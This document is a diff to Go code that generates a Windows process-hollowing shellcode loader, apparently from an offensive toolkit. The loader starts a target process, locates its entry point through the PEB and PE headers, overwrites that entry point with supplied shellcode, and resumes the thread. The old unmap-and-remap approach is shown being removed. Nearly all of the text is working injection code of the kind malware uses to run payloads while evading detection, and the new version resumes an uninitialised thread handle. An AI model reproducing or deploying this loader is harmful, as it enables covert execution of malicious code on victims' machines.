@@ -5,9 +5,6 @@ import (
 )
 
 /*
-   adapted from go-runpe:
-   https://github.com/abdullah2993/go-runpe
-
    For more information, feel free to read this:
    https://www.blackhat.com/docs/asia-17/materials/asia-17-KA-What-Malware-Authors-Don't-Want-You-To-Know-Evasive-Hollow-Process-Injection-wp.pdf
 */
@@ -21,12 +18,7 @@ func GetProcessHollowingTemplate(targetProcess string) string {
 package main
 
 import (
-    "os/exec"
-    "path/filepath"
-	"bytes"
-	"debug/pe"
 	"encoding/binary"
-	"io/ioutil"
 	"syscall"
 	"unsafe"
 )
@@ -42,17 +34,26 @@ const (
 )
 
 var (
-	modkernel32         = syscall.MustLoadDLL("kernel32.dll")
-	WriteProcessMemory  = modkernel32.MustFindProc("WriteProcessMemory")
-	ReadProcessMemory   = modkernel32.MustFindProc("ReadProcessMemory")
-	VirtualAllocEx      = modkernel32.MustFindProc("VirtualAllocEx")
-	GetThreadContext    = modkernel32.MustFindProc("GetThreadContext")
-	SetThreadContext    = modkernel32.MustFindProc("SetThreadContext")
-	ResumeThread        = modkernel32.MustFindProc("ResumeThread")
+	kernel32                = syscall.MustLoadDLL("kernel32.dll")
+    readProcessMemory       = kernel32.MustFindProc("ReadProcessMemory")
+	writeProcessMemory      = kernel32.MustFindProc("WriteProcessMemory")
+	resumeThread            = kernel32.MustFindProc("ResumeThread")
+    WaitForSingleObject     = kernel32.MustFindProc("WaitForSingleObject")
 
-	modntdll                = syscall.MustLoadDLL("ntdll.dll")
-	NtUnmapViewOfSection    = modntdll.MustFindProc("NtUnmapViewOfSection")
+	ntdll                       = syscall.MustLoadDLL("ntdll.dll")
+    zwQueryInformationProcess   = ntdll.MustFindProc("ZwQueryInformationProcess")
 )
+
+
+/* need to redefine this so that compile doesnt whine */
+type PROCESS_BASIC_INFORMATION struct {
+	Reserved1    uintptr
+	PebAddress   uintptr
+	Reserved2    uintptr
+	Reserved3    uintptr
+	UniquePid    uintptr
+	MoreReserved uintptr
+}
 
 
 func createProcess(processName string) *syscall.ProcessInformation {
@@ -81,133 +82,104 @@ func createProcess(processName string) *syscall.ProcessInformation {
 	return &pi
 }
 
-func readProcessAddr(hProcess uintptr, addr uintptr) (uintptr, error) {
-    size := 8
-
-    var numBytesRead uintptr
-    data := make([]byte, size)
-
-	r, _, err := ReadProcessMemory.Call(
-        hProcess,
-		addr,
-		uintptr(unsafe.Pointer(&data[0])),
-		uintptr(size),
-		uintptr(unsafe.Pointer(&numBytesRead)),
-    )
-	if r == 0 {
-        return 0, err
-	}
-
-	return uintptr(binary.LittleEndian.Uint64(data)), nil
-}
-
-func findProgramPath(filename string) (string, error) {
-    fname, err := exec.LookPath(filename); if err != nil {
-        return "", err
-    }
-    return filepath.Abs(fname)
-}
-
 
 func ExecuteOrderSixtySix(shellcode []byte) {
-    // target process
     processName := "%s"
     process := createProcess(processName)
+    pHandle := uintptr(process.Process)
 
-    // process & thread handles
-    hProcess := uintptr(process.Process)
-    hThread := uintptr(process.Thread)
+	processInfo := &syscall.ProcessInformation{}
+	pointerSize := unsafe.Sizeof(uintptr(0))
+	basicInfo := &PROCESS_BASIC_INFORMATION{}
+	unusedTmpValue := 0
 
-    // get thread context
-    ctx := make([]uint8, 0x4d0)
-    binary.LittleEndian.PutUint32(ctx[48:], 0x00100000|0x00000002)
-    ctxPtr := unsafe.Pointer(&ctx[0])
-
-    r, _, err := GetThreadContext.Call(hThread, uintptr(ctxPtr)); if r == 0 {
+    /* Get Process Environment Block */
+    r, _, err := zwQueryInformationProcess.Call(
+        pHandle,
+        0,
+        uintptr(unsafe.Pointer(basicInfo)),
+        pointerSize * 6,
+        uintptr(unsafe.Pointer(&unusedTmpValue)),
+    ); if r != 0 {
         panic(err)
     }
 
-    /*
-        https://stackoverflow.com/questions/37656523/declaring-context-struct-for-pinvoke-windows-x64
-        https://bytepointer.com/resources/tebpeb64.htm
-    */
-    remoteRdx := binary.LittleEndian.Uint64(ctx[136:])
-    imageBaseAddr, _ := readProcessAddr(hProcess, uintptr(remoteRdx + 16));
-    programPath, err := findProgramPath(processName); if err != nil {
+    /* Query PEB for ImageBaseAddress */
+	imageBaseAddress := basicInfo.PebAddress + 0x10
+
+    // Get entry point of the actual process executable
+    // This one is a bit complicated, because this address differs for each process (due to Address Space Layout Randomization (ASLR))
+    // From the PEB (address we got in last call), we have to do the following:
+    // 1. Read executable address from first 8 bytes (Int64, offset 0) of PEB and read data chunk for further processing
+    // 2. Read the field 'e_lfanew', 4 bytes at offset 0x3C from executable address to get the offset for the PE header
+    // 3. Take the memory at this PE header add an offset of 0x28 to get the Entrypoint Relative Virtual Address (RVA) offset
+    // 4. Read the value at the RVA offset address to get the offset of the executable entrypoint from the executable address
+    // 5. Get the absolute address of the entrypoint by adding this value to the base executable address. Success!
+
+
+    // 1. Read executable address from first 8 bytes (Int64, offset 0) of PEB and read data chunk for further processing
+    procAddr := make([]byte, 0x8)
+	read := 0
+
+    r, _, err = readProcessMemory.Call(
+        pHandle,
+        imageBaseAddress,
+        uintptr(unsafe.Pointer(&procAddr[0])),
+        uintptr(len(procAddr)),
+        uintptr(unsafe.Pointer(&read)),
+    ); if r == 0 {
         panic(err)
     }
 
-    destPE, err := ioutil.ReadFile(programPath); if err != nil {
-		panic(err)
-	}
-
-	destPEReader := bytes.NewReader(destPE)
-	f, err := pe.NewFile(destPEReader); if err != nil {
+    // now we can read PE header
+	exeBaseAddr := binary.LittleEndian.Uint64(procAddr)
+    peBuffer := make([]byte, 0x200)
+	r, _, err = readProcessMemory.Call(
+        pHandle,
+        uintptr(exeBaseAddr),
+        uintptr(unsafe.Pointer(&peBuffer[0])),
+        uintptr(len(peBuffer)),
+        uintptr(unsafe.Pointer(&read)),
+    ); if r == 0 {
         panic(err)
     }
 
-    oh, ok := f.OptionalHeader.(*pe.OptionalHeader64); if !ok {
-		panic("OptionalHeader64 not found")
-	}
+    // 2. Read the field 'e_lfanew', 4 bytes (UInt32) at offset 0x3C from executable address to get the offset for the PE header
+	lfaNewPos := peBuffer[0x3c : 0x3c + 0x4]
+	lfanew := binary.LittleEndian.Uint32(lfaNewPos)
 
-    /* unmapping image from process */
-    r, _, err = NtUnmapViewOfSection.Call(
-        hProcess,
-        imageBaseAddr,
-    );
+    // 3. Take the memory at this PE header add an offset of 0x28 to get the Entrypoint Relative Virtual Address (RVA) offset
+	rvaOffset := lfanew + 0x28
+    rvaOffsetPos := peBuffer[rvaOffset : rvaOffset + 0x4]
 
-    /* allocating data */
-    newBaseImage, _, err := VirtualAllocEx.Call(
-        hProcess,
-        imageBaseAddr,
-        uintptr(len(shellcode)),
-        uintptr(MEM_COMMIT | MEM_RESERVE),
-        uintptr(PAGE_EXECUTE_READWRITE),
-    ); if newBaseImage == 0 {
-        panic(err)
-    }
+    // 4. Read the 4 bytes (UInt32) at the RVA offset to get the offset of the executable entrypoint from the executable address
+    rva := binary.LittleEndian.Uint32(rvaOffsetPos)
 
-    /* writing program to memory */
-    var numBytesRead uintptr
-    r, _, err = WriteProcessMemory.Call(
-        hProcess,
-        newBaseImage,
+    // 5. Get the absolute address of the entrypoint by adding this value to the base executable address. Success!
+    entrypointAddress := exeBaseAddr + uint64(rva)
+
+
+    /* overwrite process memory at entrypointAddress */
+    r, _, err = writeProcessMemory.Call(
+        pHandle,
+        uintptr(entrypointAddress),
         uintptr(unsafe.Pointer(&shellcode[0])),
         uintptr(len(shellcode)),
-        uintptr(unsafe.Pointer(&numBytesRead)),
+        0,
     ); if r == 0 {
         panic(err)
     }
 
-    /* writing new image base to rdx */
-    addr := make([]byte, 8)
-	binary.LittleEndian.PutUint64(addr, uint64(newBaseImage))
-	r, _, err = WriteProcessMemory.Call(
-        hProcess,
-        uintptr(remoteRdx + 16),
-        uintptr(unsafe.Pointer(&addr)),
-        uintptr(8),
-        uintptr(unsafe.Pointer(&numBytesRead)),
-    ); if r == 0 {
-		panic(err)
-	}
+    /* trigger shellcode execution */
+	r, _, err = resumeThread.Call(uintptr(processInfo.Thread)); if r == 0 {
+        panic(err)
+    }
 
-    /* setting thread context again ! */
-    binary.LittleEndian.PutUint64(
-        ctx[128:],
-        uint64(newBaseImage) + uint64(oh.AddressOfEntryPoint),
+
+    WaitForSingleObject.Call(
+        uintptr(processInfo.Thread),
+        0xFFFFFFFF,
     )
-    r, _, err = SetThreadContext.Call(
-        hThread,
-        uintptr(unsafe.Pointer(&ctx[0])),
-    ); if r == 0 {
-        panic(err)
-    }
-
-    /* Resuming thread and execute payload */
-    r, _, err = ResumeThread.Call(hThread); if r == 0xfffffff {
-        panic(err)
-    }
 }
     `, targetProcess)
 }
